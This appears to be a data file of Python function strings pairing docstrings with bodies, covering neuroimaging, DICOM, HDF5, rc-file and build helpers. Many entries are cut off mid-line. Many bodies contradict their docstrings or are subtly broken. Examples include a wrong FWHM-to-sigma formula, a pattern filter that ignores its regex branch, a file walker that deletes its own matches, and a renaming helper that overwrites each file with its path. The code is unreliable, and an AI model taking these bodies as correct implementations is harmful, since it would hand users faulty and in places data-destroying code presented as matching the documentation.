        "def merge_dicts(dict_1, dict_2):\n    \"\"\"Merge two dictionaries.\n\n    Values that evaluate to true take priority over falsy values.\n    `dict_1` takes priority over `dict_2`.\n    \"\"\"\n    for key, value in dict_1.items():\n        if value is True:\n            dict_2[key] = True\n        elif value is False:\n            dict_2[key] = False\n    return dict_2",
        "def _expand_rcpath(rcpath, section_name, app_name):\n    \"\"\"Return a folder path if it exists.\n\n    First will check if it is an existing system path, if it is, will return it\n    expanded and absoluted.\n\n    If this fails will look for the rcpath variable in the app_name rcfiles or\n    exclusively within the given section_name, if given.\n\n    Parameters\n    ----------\n    rcpath: str\n        Existing folder path or variable name in app_name rcfile with an\n        existing one.\n\n    section_name: str\n        Name of a section in the app_name rcfile to look exclusively there for\n        variable names.\n\n    app_name: str\n        Name of the application to look for rcfile configuration files.\n\n    Returns\n    -------\n    sys_path: str\n",
        "def rcfile(appname, section=None, args=None, strip_dashes=False):\n    \"\"\"\n    Read environment variables and config files and return them merged with\n    predefined list of arguments.\n\n    Parameters\n    ----------\n    appname: str\n        Application name, used for config files and environment variable\n        names.\n\n    section: str\n        Name of the section to be read. If this is not set: appname.\n\n    args:\n        arguments from command line (optparse, docopt, etc).\n\n    strip_dashes: bool\n        Strip dashes prefixing key names from args dict.\n\n    Returns\n    --------\n    dict\n        containing the merged variables of environment variables, config\n        files and args.\n\n    Raises\n    ------\n    IOError\n        In case the return value is empty.\n\n    Notes\n    -----\n    Environment variables are read",
        "def get_rcfile_settings(section_name, app_name):\n    \"\"\"\n    Return the dictionary containing the rcfile section configuration\n    variables.\n\n    Parameters\n    ----------\n    section_name: str\n        Name of the section in the rcfiles.\n\n    app_name: str\n        Name of the application to look for its rcfiles.\n\n    Returns\n    -------\n    settings: dict\n        Dict with variable values\n    \"\"\"\n    settings = {}\n    for rcfile in get_rcfiles(section_name, app_name):\n        settings.update(rcfile.settings)\n    return settings",
        "def get_rc_var(var_name, section_name, app_name):\n    \"\"\"\n    Return the value of the variable in the section_name section of the\n    app_name rc file.\n\n    Parameters\n    ----------\n    var_name: str\n        Name of the variable to be searched for.\n\n    section_name: str\n        Name of the section in the rcfiles.\n\n    app_name: str\n        Name of the application to look for its rcfiles.\n\n    Returns\n    -------\n    var_value: str\n        The value of the variable with given var_name.\n    \"\"\"\n    rc_file = get_rc_file(app_name)\n    return rc_file.get(section_name, var_name)",
        "def find_first_rcfile_section(var_name, app_name):\n    \"\"\"\n    Return the section and the value of the variable where the first\n    var_name is found in the app_name rcfiles.\n\n    Parameters\n    ----------\n    var_name: str\n        Name of the variable to be searched for.\n\n    app_name: str\n        Name of the application to look for its rcfiles.\n\n    Returns\n    -------\n    section_name: str\n        Name of the section in the rcfiles where var_name was first found.\n\n    var_value: str\n        The value of the first variable with given var_name.\n    \"\"\"\n    for section_name, var_value in _find_rcfiles(app_name):\n        if var_name in var_value:\n            return section_name, var_value\n    return",
        "def filter_lst(lst, pattern):\n    \"\"\"\n    Filters the lst using pattern.\n    If pattern starts with '(' it will be considered a re regular expression,\n    otherwise it will use fnmatch filter.\n\n    :param lst: list of strings\n\n    :param pattern: string\n\n    :return: list of strings\n    Filtered list of strings\n    \"\"\"\n    if pattern.startswith('('):\n        return [x for x in lst if fnmatch.fnmatch(x, pattern[1:])]\n    else:\n        return [x for x in lst if fnmatch.fnmatch(x, pattern)]",
        "def adict_get(adict, path, sep='.'):\n    \"\"\"\n    Given a nested dictionary adict.\n    This returns its childen just below the path.\n    The path is a string composed of adict keys separated by sep.\n\n    :param adict: nested dict\n\n    :param path: str\n\n    :param sep: str\n\n    :return: dict or list or leaf of treemap\n    \"\"\"\n    if path is None:\n        return adict\n    else:\n        return adict_get(adict[path], path[1:], sep)",
        "def get_all_leave_elements(adict):\n    \"\"\"\n    Given a nested dictionary, this returns all its leave elements in a list.\n\n    :param adict:\n\n    :return: list\n    \"\"\"\n    return [key for key in adict.keys() if key not in adict.values()]",
        "def _get_files(base_path, path_regex):\n    \"\"\"\n    Looks for path_regex within base_path. Each match is append\n    in the returned list.\n    path_regex may contain subfolder structure.\n    If any part of the folder structure is a\n\n    :param base_path: str\n\n    :param path_regex: str\n\n    :return list of strings\n    \"\"\"\n    files = []\n    for root, dirs, files in os.walk(base_path):\n        for filename in files:\n            if re.match(path_regex, filename):\n                files.remove(filename)\n    return files",
        "def create_dirpath(dirpath, overwrite=True):\n    \"\"\" Will create dirpath folder. If dirpath already exists and overwrite is False,\n        will append a '+' suffix to dirpath until dirpath does not exist.\n    \"\"\"\n    if not os.path.exists(dirpath):\n        os.makedirs(dirpath)\n    if overwrite:\n        dirpath += '+'\n    return dirpath",
        "def import_file(self, filepath):\n        \"\"\"\n        Imports filetree and root_path variable values from the filepath.\n\n        :param filepath:\n        :return: root_path and filetree\n        \"\"\"\n        root_path = os.path.dirname(filepath)\n        filetree = self.get_filetree(filepath)\n        return root_path, filetree",
        "def remove_nodes(self, pattern):\n        \"\"\"Remove the nodes that match the pattern.\"\"\"\n        for node in self.nodes:\n            if re.match(pattern, node.name):\n                self.remove_node(node)",
        "def count(self, pattern, adict=None):\n        \"\"\"\n        Return the number of nodes that match the pattern.\n\n        :param pattern:\n\n        :param adict:\n        :return: int\n        \"\"\"\n        return self.query(pattern, adict).count()",
        "def float_array(X, copy=False):\n    \"\"\"Converts an array-like to an array of floats\n\n    The new dtype will be np.float32 or np.float64, depending on the original\n    type. The function can create a copy or modify the argument depending\n    on the argument copy.\n\n    Parameters\n    ----------\n    X : {array-like, sparse matrix}\n\n    copy : bool, optional\n        If True, a copy of X will be created. If False, a copy may still be\n        returned if X's dtype is not a floating point type.\n\n    Returns\n    -------\n    XT : {array, sparse matrix}\n        An array of type np.float\n    \"\"\"\n    if X.dtype.kind == 'f':\n        return X.astype(np.float32)\n    elif X.dtype.kind == 'i':\n",
        "def make_indexable(iterables):\n    \"\"\"Make arrays indexable for cross-validation.\n\n    Checks consistent length, passes through None, and ensures that everything\n    can be indexed by converting sparse matrices to csr and converting\n    non-interable objects to arrays.\n\n    Parameters\n    ----------\n    iterables : lists, dataframes, arrays, sparse matrices\n        List of objects to ensure sliceability.\n    \"\"\"\n    if not iterables:\n        return\n    if not isinstance(iterables[0], (list, dataframes.DataFrame)):\n        iterables = [iterables]\n    if not all(isinstance(x, (list, dataframes.DataFrame)) for x in iterables):\n        raise ValueError('All iterables must be lists or dataframes')\n    if not all(isinstance(x, (list, dataframes.DataFrame)) for x in iterables):\n        raise ValueError('All iterables",
        "def validate_array(array, accept_sparse=None, order=None, copy=False,\n                   force_all_finite=True, ensure_2d=True, allow_nd=False):\n    \"\"\"Input validation on an array, list, sparse matrix or similar.\n\n    By default, the input is converted to an at least 2nd numpy array.\n\n    Parameters\n    ----------\n    array : object\n        Input object to check / convert.\n\n    accept_sparse : string, list of string or None (default=None)\n        String[s] representing allowed sparse matrix formats, such as 'csc',\n        'csr', etc.  None means that sparse matrix input will raise an error.\n        If the input is sparse but not in the allowed format, it will be\n        converted to the first listed format.\n\n    order : 'F', 'C' or None (default=",
        "def _input_validation(X, y, accept_sparse=None, order=None, copy=False,\n                       force_all_finite=True, ensure_2d=True, allow_nd=False):\n    \"\"\"Input validation for standard estimators.\n\n    Checks X and y for consistent length, enforces X 2d and y 1d.\n    Standard input checks are only applied to y. For multi-label y,\n    set multi_ouput=True to allow 2d and sparse y.\n\n    Parameters\n    ----------\n    X : nd-array, list or sparse matrix\n        Input data.\n\n    y : nd-array, list or sparse matrix\n        Labels.\n\n    accept_sparse : string, list of string or None (default=None)\n        String[s] representing allowed sparse matrix formats, such as 'csc',\n        'csr', etc",
        "def _check_y(y):\n    \"\"\"Ravel column or 1d numpy array, else raises an error\n\n    Parameters\n    ----------\n    y : array-like\n\n    Returns\n    -------\n    y : array\n    \"\"\"\n    if not isinstance(y, np.ndarray):\n        raise ValueError('y must be a numpy array')\n    if y.ndim != 1:\n        raise ValueError('y must be a numpy array')\n    return y",
        "def _check_float(data):\n    \"\"\"Warning utility function to check that data type is floating point.\n\n    Returns True if a warning was raised (i.e. the input is not float) and\n    False otherwise, for easier input validation.\n    \"\"\"\n    if not isinstance(data, float):\n        warnings.warn(\n            \"Input data must be float, not %s\" % type(data).__name__,\n            RuntimeWarning,\n        )\n    return True",
        "def as_ndarray(arr, copy=False, dtype=None, order='K'):\n    \"\"\"Convert an arbitrary array to numpy.ndarray.\n\n    In the case of a memmap array, a copy is automatically made to break the\n    link with the underlying file (whatever the value of the \"copy\" keyword).\n\n    The purpose of this function is mainly to get rid of memmap objects, but\n    it can be used for other purposes. In particular, combining copying and\n    casting can lead to performance improvements in some cases, by avoiding\n    unnecessary copies.\n\n    If not specified, input array order is preserved, in all cases, even when\n    a copy is requested.\n\n    Caveat: this function does not copy during bool to/from 1-byte dtype\n    conversions. This can lead to some surprising results in some rare cases.\n    Example:\n",
        "def apply_transformations(atlas_filepath,\n                          anatbrain_filepath,\n                          meanfunc_filepath,\n                          atlas2anat_nonlin_xfm_filepath,\n                          is_atlas2anat_inverted,\n                          anat2func_lin_xfm_filepath,\n                          atlasinanat_out_filepath,\n                          atlasinfunc_out_filepath,\n                          verbose=False,\n                          rewrite=False,\n                          parallel=False,\n                          fsl_dir=None,\n                          fsl_cmd=None,\n                          fsl_args=None,\n                          fsl_kwargs=None):\n    \"\"\"\n    Call FSL tools to apply transformations to a given atlas to a functional image.\n    Given the transformation matrices.\n\n    Parameters\n    ----------\n    atlas_filepath: str\n        Path to the 3D atlas volume file.\n",
        "def fwhm_to_sigma(fwhm):\n    \"\"\"Convert a FWHM value to sigma in a Gaussian kernel.\n\n    Parameters\n    ----------\n    fwhm: float or numpy.array\n       fwhm value or values\n\n    Returns\n    -------\n    fwhm: float or numpy.array\n       sigma values\n    \"\"\"\n    if isinstance(fwhm, float):\n        return np.exp(-fwhm * np.log(2))\n    else:\n        return np.exp(-fwhm * np.log(2))",
        "def sigma_to_fwhm(sigma):\n    \"\"\"Convert a sigma in a Gaussian kernel to a FWHM value.\n\n    Parameters\n    ----------\n    sigma: float or numpy.array\n       sigma value or values\n\n    Returns\n    -------\n    fwhm: float or numpy.array\n       fwhm values corresponding to `sigma` values\n    \"\"\"\n    if sigma is None:\n        return None\n    if sigma.ndim == 1:\n        sigma = sigma.reshape(1, -1)\n    return np.sqrt(np.sum(sigma**2, axis=1) / np.sum(sigma, axis=1))",
        "def smooth_gaussian(arr, affine, fwhm=None, copy=False):\n    \"\"\"Smooth images with a a Gaussian filter.\n\n    Apply a Gaussian filter along the three first dimensions of arr.\n\n    Parameters\n    ----------\n    arr: numpy.ndarray\n        3D or 4D array, with image number as last dimension.\n\n    affine: numpy.ndarray\n        Image affine transformation matrix for image.\n\n    fwhm: scalar, numpy.ndarray\n        Smoothing kernel size, as Full-Width at Half Maximum (FWHM) in millimeters.\n        If a scalar is given, kernel width is identical on all three directions.\n        A numpy.ndarray must have 3 elements, giving the FWHM along each axis.\n\n    copy: bool\n        if True, will make a copy of the input array. Otherwise will directly smooth the input array.\n",
        "def smooth_gaussian(imgs, fwhm=None):\n    \"\"\"Smooth images using a Gaussian filter.\n\n    Apply a Gaussian filter along the three first dimensions of each image in images.\n    In all cases, non-finite values in input are zeroed.\n\n    Parameters\n    ----------\n    imgs: str or img-like object or iterable of img-like objects\n        See boyle.nifti.read.read_img\n        Image(s) to smooth.\n\n    fwhm: scalar or numpy.ndarray\n        Smoothing kernel size, as Full-Width at Half Maximum (FWHM) in millimeters.\n        If a scalar is given, kernel width is identical on all three directions.\n        A numpy.ndarray must have 3 elements, giving the FWHM along each axis.\n\n    Returns\n    -------\n    smooth_imgs: nib",
        "def smooth_gaussian_filter(arr, affine, fwhm='fast', ensure_finite=True,\n                          copy=False, **kwargs):\n    \"\"\"Smooth images by applying a Gaussian filter.\n    Apply a Gaussian filter along the three first dimensions of arr.\n\n    This is copied and slightly modified from nilearn:\n    https://github.com/nilearn/nilearn/blob/master/nilearn/image/image.py\n    Added the **kwargs argument.\n\n    Parameters\n    ==========\n    arr: numpy.ndarray\n        4D array, with image number as last dimension. 3D arrays are also\n        accepted.\n    affine: numpy.ndarray\n        (4, 4) matrix, giving affine transformation for image. (3, 3) matrices\n        are also accepted (only these coefficients are used).\n        If fwhm='fast', the affine",
        "def smooth_gaussian(imgs, fwhm=None, **kwargs):\n    \"\"\"Smooth images by applying a Gaussian filter.\n    Apply a Gaussian filter along the three first dimensions of arr.\n    In all cases, non-finite values in input image are replaced by zeros.\n\n    This is copied and slightly modified from nilearn:\n    https://github.com/nilearn/nilearn/blob/master/nilearn/image/image.py\n    Added the **kwargs argument.\n\n    Parameters\n    ==========\n    imgs: Niimg-like object or iterable of Niimg-like objects\n        See http://nilearn.github.io/manipulating_images/manipulating_images.html#niimg.\n        Image(s) to smooth.\n    fwhm: scalar, numpy.ndarray, 'fast' or None\n       ",
        "def _create_session(self):\n        \"\"\"Create requests session with any required auth headers\n        applied.\n\n        :rtype: requests.Session.\n        \"\"\"\n        session = requests.Session()\n        session.headers.update(self._auth_headers)\n        return session",
        "def _create_session(self):\n        \"\"\"Create requests session with AAD auth headers\n\n        :rtype: requests.Session.\n        \"\"\"\n        session = requests.Session()\n        session.headers.update(self._auth_headers)\n        return session",
        "def _img_to_grid(img):\n    \"\"\"Return a grid with coordinates in 3D physical space for `img`.\"\"\"\n    img = np.asanyarray(img, dtype=np.uint8)\n    img = img.reshape((-1, 3))\n    return np.array([[0, 0, 0], [0, 0, 1], [0, 0, 2]], dtype=np.uint8)",
        "def get_coordinate_map(img):\n    \"\"\"Gets a 3D CoordinateMap from img.\n\n    Parameters\n    ----------\n    img: nib.Nifti1Image or nipy Image\n\n    Returns\n    -------\n    nipy.core.reference.coordinate_map.CoordinateMap\n    \"\"\"\n    if isinstance(img, nib.Nifti1Image):\n        img = img.get_data()\n    return CoordinateMap(img.shape, img.dtype, img.ndim)",
        "def get_header_affine(image):\n    \"\"\"Return the header and affine matrix from a Nifti file.\n\n    Parameters\n    ----------\n    image: img-like object or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    Returns\n    -------\n    hdr, aff\n    \"\"\"\n    if isinstance(image, str):\n        if os.path.exists(image):\n            image = nibabel.load(image)\n       ",
        "def voxel_matrix(image, safe_mode=False, copy=False):\n    \"\"\"\n    Return the voxel matrix of the Nifti file.\n    If safe_mode will make a copy of the img before returning the data, so the input image is not modified.\n\n    Parameters\n    ----------\n    image: img-like object or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    copy: bool\n    If safe_mode will make a",
        "def read_nii_file(nii_file):\n    \"\"\"Read a Nifti file and return as nipy.Image\n\n    Parameters\n    ----------\n    param nii_file: str\n        Nifti file path\n\n    Returns\n    -------\n    nipy.Image\n    \"\"\"\n    try:\n        with open(nii_file, 'rb') as f:\n            return Image.open(f)\n    except IOError:\n        raise IOError('Could not open file: %s' % nii_file)",
        "def get_nifti_files_as_array(img_filelist, outdtype=None):\n    \"\"\"\n    From the list of absolute paths to nifti files, creates a Numpy array\n    with the data.\n\n    Parameters\n    ----------\n    img_filelist:  list of str\n        List of absolute file paths to nifti files. All nifti files must have\n        the same shape.\n\n    outdtype: dtype\n        Type of the elements of the array, if not set will obtain the dtype from\n        the first nifti file.\n\n    Returns\n    -------\n    outmat: Numpy array with shape N x prod(vol.shape)\n            containing the N files as flat vectors.\n\n    vol_shape: Tuple with shape of the volumes, for reshaping.\n    \"\"\"\n    # Get the first nifti file\n   ",
        "def crop(image, slices, copy=True):\n    \"\"\"Crops image to a smaller size\n\n    Crop img to size indicated by slices and modify the affine accordingly.\n\n    Parameters\n    ----------\n    image: img-like object or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n        Image to be cropped.\n\n    slices: list of slices\n        Defines the range of the crop.\n        E.g. [slice(20",
        "def crop(image, rtol=0.05, copy=False):\n    \"\"\"Crops img as much as possible\n\n    Will crop img, removing as many zero entries as possible\n    without touching non-zero entries. Will leave one voxel of\n    zero padding around the obtained non-zero area in order to\n    avoid sampling issues later on.\n\n    Parameters\n    ----------\n    image: img-like object or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise",
        "def load_image(ref_niimg, data, affine=None, copy_header=False):\n    \"\"\"Create a new image of the same class as the reference image\n\n    Parameters\n    ----------\n    ref_niimg: image\n        Reference image. The new image will be of the same type.\n\n    data: numpy array\n        Data to be stored in the image\n\n    affine: 4x4 numpy array, optional\n        Transformation matrix\n\n    copy_header: boolean, optional\n        Indicated if the header of the reference image should be used to\n        create the new image\n\n    Returns\n    -------\n    new_img: image\n        A loaded image with the same type (and header) as the reference image.\n    \"\"\"\n    if affine is None:\n        affine = np.eye(4)\n    new_img = ref_niimg.copy()\n   ",
        "def get_h5file(file_path, mode='a'):\n    \"\"\"Return the h5py.File given its file path.\n\n    Parameters\n    ----------\n    file_path: string\n        HDF5 file path\n\n    mode: string\n        r   Readonly, file must exist\n        r+  Read/write, file must exist\n        w   Create file, truncate if exists\n        w-  Create file, fail if exists\n        a   Read/write if exists, create otherwise (default)\n\n    Returns\n    -------\n    h5file: h5py.File\n    \"\"\"\n    if not os.path.exists(file_path):\n        raise IOError('File %s does not exist' % file_path)\n    if mode == 'w':\n        h5file = h5py.File(file_path, 'w')\n    elif mode",
        "def read_datasets(h5file, h5path):\n    \"\"\"Return all dataset contents from h5path group in h5file in an OrderedDict.\n\n    Parameters\n    ----------\n    h5file: h5py.File\n        HDF5 file object\n\n    h5path: str\n        HDF5 group path to read datasets from\n\n    Returns\n    -------\n    datasets: OrderedDict\n        Dict with variables contained in file_path/h5path\n    \"\"\"\n    datasets = OrderedDict()\n    for key in h5file.keys():\n        if key.startswith(h5path):\n            datasets[key[len(h5path):]] = h5file[key]\n    return datasets",
        "def get_group_names(h5file, h5path, node_type):\n    \"\"\"Return the node of type node_type names within h5path of h5file.\n\n    Parameters\n    ----------\n    h5file: h5py.File\n        HDF5 file object\n\n    h5path: str\n        HDF5 group path to get the group names from\n\n    node_type: h5py object type\n        HDF5 object type\n\n    Returns\n    -------\n    names: list of str\n        List of names\n    \"\"\"\n    names = []\n    for node in h5file[h5path]:\n        if isinstance(node, node_type):\n            names.append(node.name)\n    return names",
        "def mask(self, image):\n        \"\"\"self.mask setter\n\n        Parameters\n        ----------\n        image: str or img-like object.\n            See NeuroImage constructor docstring.\n        \"\"\"\n        if isinstance(image, str):\n            image = NeuroImage(image)\n        self.mask = image.mask",
        "def load_images(self):\n        \"\"\"Read the images, load them into self.items and set the labels.\"\"\"\n        for image in self.images:\n            self.items.append(ImageItem(image, self.image_size))\n            self.labels.append(image.name)",
        "def save_to_file(self, output_file, smooth_fwhm=None, outdtype=None, outmask=None, outvol=None,\n                    outmask_indices=None, outvol_shape=None, **kwargs):\n        \"\"\"\n        Save the Numpy array created from to_matrix function to the output_file.\n\n        Will save into the file: outmat, mask_indices, vol_shape and self.others (put here whatever you want)\n\n            data: Numpy array with shape N x prod(vol.shape)\n                  containing the N files as flat vectors.\n\n            mask_indices: matrix with indices of the voxels in the mask\n\n            vol_shape: Tuple with shape of the volumes, for reshaping.\n\n        Parameters\n        ----------\n        output_file: str\n            Path to the output file. The extension of the file",
        "def error(msg, *args, **kwargs):\n    \"\"\"Writes msg to stderr and exits with return code\"\"\"\n    print(msg, file=sys.stderr)\n    sys.exit(1)",
        "def _call_command(cmd_args):\n    \"\"\"\n    Calls the command\n\n    Parameters\n    ----------\n    cmd_args: list of str\n        Command name to call and its arguments in a list.\n\n    Returns\n    -------\n    Command output\n    \"\"\"\n    cmd = subprocess.Popen(cmd_args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = cmd.communicate()\n    return stdout.decode('utf-8'), stderr.decode('utf-8')",
        "def call_cmd(cmd_name, arg_strings):\n    \"\"\"Call CLI command with arguments and returns its return value.\n\n    Parameters\n    ----------\n    cmd_name: str\n        Command name or full path to the binary file.\n\n    arg_strings: list of str\n        Argument strings list.\n\n    Returns\n    -------\n    return_value\n        Command return value.\n    \"\"\"\n    cmd = subprocess.Popen(cmd_name, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    stdout, stderr = cmd.communicate(arg_strings)\n    return_value = stdout.decode('utf-8')\n    return return_value",
        "def submit_cmd(cmd):\n    \"\"\"\n    Tries to submit cmd to HTCondor, if it does not succeed, it will\n    be called with subprocess.call.\n\n    Parameters\n    ----------\n    cmd: string\n        Command to be submitted\n\n    Returns\n    -------\n\n    \"\"\"\n    try:\n        subprocess.call(cmd)\n    except subprocess.CalledProcessError as e:\n        print(\"Command failed: %s\" % e)",
        "def submit_cmd(cmd):\n    \"\"\"Submits cmd to HTCondor queue\n\n    Parameters\n    ----------\n    cmd: string\n        Command to be submitted\n\n    Returns\n    -------\n    int\n        returncode value from calling the submission command.\n    \"\"\"\n    if not os.path.exists(os.path.dirname(cmd)):\n        os.makedirs(os.path.dirname(cmd))\n    with open(cmd, 'w') as f:\n        f.write(cmd)\n    return subprocess.call(['htcondor', '-q', '-t', 'submit', '-c', cmd])",
        "def clean(ctx):\n    \"\"\"Clean previously built package artifacts.\"\"\"\n    ctx.run('rm -rf %s' % ctx.obj['BUILD_DIR'])\n    ctx.run('rm -rf %s' % ctx.obj['BUILD_DIR_CACHE'])\n    ctx.run('rm -rf %s' % ctx.obj['BUILD_DIR_CACHE_CACHE'])\n    ctx.run('rm -rf %s' % ctx.obj['BUILD_DIR_CACHE_CACHE'])\n    ctx.run('rm -rf %s' % ctx.obj['BUILD_DIR_CACHE_CACHE'])\n    ctx.run('rm -rf %s' % ctx.obj['BUILD_DIR_CACHE_CACHE'])\n    ctx.run('rm -rf %s' % ctx.obj['BUILD_DIR_CACHE_CACHE'])\n    ctx.run('rm -rf %s' % ctx.",
        "def upload(repo):\n    \"\"\"Upload the package to an index server.\n\n    This implies cleaning and re-building the package.\n\n    :param repo: Required. Name of the index server to upload to, as specifies\n        in your .pypirc configuration file.\n    \"\"\"\n    # TODO: This is a temporary hack to get around a bug in pypi.\n    # https://github.com/pypa/pypi/issues/225\n    # We should use a temporary file to store the package to a temporary\n    # location.\n    tmp_file = tempfile.NamedTemporaryFile(delete=False)\n    tmp_file.write(packaging.utils.get_package_data(\n        'pypi', 'index.json'))\n    tmp_file.flush()\n    cmd = ['pypirc', 'upload', '--no-check-certificate', '--no-",
        "def load_commands(self):\n        \"\"\"Load all Service Fabric commands\"\"\"\n        for command in self.get_commands():\n            self.load_command(command)",
        "def open_vol(filepath):\n    \"\"\"Open a volumetric file using the tools following the file extension.\n\n    Parameters\n    ----------\n    filepath: str\n        Path to a volume file\n\n    Returns\n    -------\n    volume_data: np.ndarray\n        Volume data\n\n    pixdim: 1xN np.ndarray\n        Vector with the description of the voxels physical size (usually in mm) for each volume dimension.\n\n    Raises\n    ------\n    IOError\n        In case the file is not found.\n    \"\"\"\n    # Get the file extension\n    ext = os.path.splitext(filepath)[1]\n\n    # Open the file\n    with open(filepath, 'rb') as f:\n        # Read the file\n        volume_data = f.read()\n\n    # Get the voxel dimensions\n    pixdim = np.array([int(",
        "def pad_serial_number(file_lst):\n    \"\"\"\n    Will rename all files in file_lst to a padded serial\n    number plus its extension\n\n    :param file_lst: list of path.py paths\n    \"\"\"\n    for file_path in file_lst:\n        file_path = os.path.abspath(file_path)\n        file_path = os.path.splitext(file_path)[0] + '.py'\n        with open(file_path, 'w') as f:\n            f.write(file_path)",
        "def _search_dicoms(self, folders):\n        \"\"\"\n        Search for dicoms in folders and save file paths into\n        self.dicom_paths set.\n\n        :param folders: str or list of str\n        \"\"\"\n        if isinstance(folders, str):\n            folders = [folders]\n        for folder in folders:\n            for root, dirs, files in os.walk(folder):\n                for filename in files:\n                    if filename.endswith('.dicom'):\n                        self.dicom_paths.add(os.path.join(root, filename))",
        "def _add_fileset(self, fileset, check_if_dicoms=False):\n        \"\"\"\n        Overwrites self.items with the given set of files.\n        Will filter the fileset and keep only Dicom files.\n\n        Parameters\n        ----------\n        fileset: iterable of str\n        Paths to files\n\n        check_if_dicoms: bool\n        Whether to check if the items in fileset are dicom file paths\n        \"\"\"\n        if check_if_dicoms:\n            if not isinstance(fileset, set):\n                raise ValueError('fileset must be a set of files')\n            if len(fileset) > 1:\n                raise ValueError('fileset must be a set of files')\n            fileset = fileset.intersection(self.files)\n        for path in fileset:\n            self.items.append(self._get_file(",
        "def update(self, dicomset):\n        \"\"\"\n        Update this set with the union of itself and dicomset.\n\n        Parameters\n        ----------\n        dicomset: DicomFileSet\n        \"\"\"\n        self.update_from_dicomset(dicomset)\n        self.update_from_dicomfiles(dicomset)",
        "def copy_to_folder(self, output_folder, rename_files=False, mkdir=True, verbose=False):\n        \"\"\"\n        Copies all files within this set to the output_folder\n\n        Parameters\n        ----------\n        output_folder: str\n        Path of the destination folder of the files\n\n        rename_files: bool\n        Whether or not rename the files to a sequential format\n\n        mkdir: bool\n        Whether to make the folder if it does not exist\n\n        verbose: bool\n        Whether to print to stdout the files that are beind copied\n        \"\"\"\n        for filename in self.files:\n            if rename_files:\n                filename = self.rename_file(filename)\n            if mkdir:\n                os.makedirs(os.path.dirname(output_folder))\n            if verbose:\n                print(\"Copying file %s to %s\"",
        "def _create_read_dicom_file_lambda(self, store_store_metadata, header_fields):\n        \"\"\"\n        Creates a lambda function to read DICOM files.\n        If store_store_metadata is False, will only return the file path.\n        Else if you give header_fields, will return only the set of of\n        header_fields within a DicomFile object or the whole DICOM file if\n        None.\n\n        :return: function\n        This function has only one parameter: file_path\n        \"\"\"\n        if store_store_metadata:\n            return lambda file_path: self._read_dicom_file(file_path, header_fields)\n        else:\n            return lambda file_path: self._read_dicom_file_full(file_path, header_fields)",
        "def _read_dcm_files(self):\n        \"\"\"\n        Generator that yields one by one the return value for self.read_dcm\n        for each file within this set\n        \"\"\"\n        for path in self.paths:\n            yield self.read_dcm(path)",
        "def get_field_values(dcm_file_list, field_name):\n    \"\"\"Return a set of unique field values from a list of DICOM files\n\n    Parameters\n    ----------\n    dcm_file_list: iterable of DICOM file paths\n\n    field_name: str\n     Name of the field from where to get each value\n\n    Returns\n    -------\n    Set of field values\n    \"\"\"\n    field_values = set()\n    for dcm_file in dcm_file_list:\n        try:\n            field_values = set(getattr(dcm_file, field_name))\n        except AttributeError:\n            pass\n    return field_values",
        "def get_dicoms(root_path):\n    \"\"\"Returns a list of the dicom files within root_path\n\n    Parameters\n    ----------\n    root_path: str\n    Path to the directory to be recursively searched for DICOM files.\n\n    Returns\n    -------\n    dicoms: set\n    Set of DICOM absolute file paths\n    \"\"\"\n    dicoms = set()\n    for root, dirs, files in os.walk(root_path):\n        for filename in files:\n            if filename.endswith('.dicom'):\n                dicoms.add(os.path.join(root, filename))\n    return dicoms",
        "def read_file(filepath):\n    \"\"\"\n    Tries to read the file using dicom.read_file,\n    if the file exists and dicom.read_file does not raise\n    and Exception returns True. False otherwise.\n\n    :param filepath: str\n     Path to DICOM file\n\n    :return: bool\n    \"\"\"\n    try:\n        return dicom.read_file(filepath)\n    except Exception as e:\n        if e.args[0] == 'File does not exist':\n            return False\n        else:\n            raise",
        "def group_dicom_files(dicom_paths, hdr_field):\n    \"\"\"\n    Group in a dictionary all the DICOM files in dicom_paths\n    separated by the given `hdr_field` tag value.\n\n    Parameters\n    ----------\n    dicom_paths: str\n        Iterable of DICOM file paths.\n\n    hdr_field: str\n        Name of the DICOM tag whose values will be used as key for the group.\n\n    Returns\n    -------\n    dicom_groups: dict of dicom_paths\n    \"\"\"\n    dicom_groups = {}\n    for dicom_path in dicom_paths:\n        dicom_group = dicom_path.split(hdr_field)\n        dicom_groups[dicom_group[0]] = dicom_group[1:]\n    return dicom_groups",
        "def get_attributes(self, attributes, default=None):\n        \"\"\"Return the attributes values from this DicomFile\n\n        Parameters\n        ----------\n        attributes: str or list of str\n         DICOM field names\n\n        default: str\n         Default value if the attribute does not exist.\n\n        Returns\n        -------\n        Value of the field or list of values.\n        \"\"\"\n        if isinstance(attributes, str):\n            attributes = [attributes]\n        return [self.get_attribute(a, default) for a in attributes]",
        "def concatenate(images, axis='t'):\n    \"\"\"Concatenate `images` in the direction determined in `axis`.\n\n    Parameters\n    ----------\n    images: list of str or img-like object.\n        See NeuroImage constructor docstring.\n\n    axis: str\n      't' : concatenate images in time\n      'x' : concatenate images in the x direction\n      'y' : concatenate images in the y direction\n      'z' : concatenate images in the z direction\n\n    Returns\n    -------\n    merged: img-like object\n    \"\"\"\n    if axis == 't':\n        return np.concatenate(images)\n    elif axis == 'x':\n        return np.concatenate([images[0], images[1:]])\n    elif axis == 'y':\n        return np.concatenate([images[0], images[1:], images[",
        "def process_image(func):\n    \"\"\"\n    Picks a function whose first argument is an `img`, processes its\n    data and returns a numpy array. This decorator wraps this numpy array\n    into a nibabel.Nifti1Image.\n    \"\"\"\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        img = func(*args, **kwargs)\n        return process_image(img)\n    return wrapper",
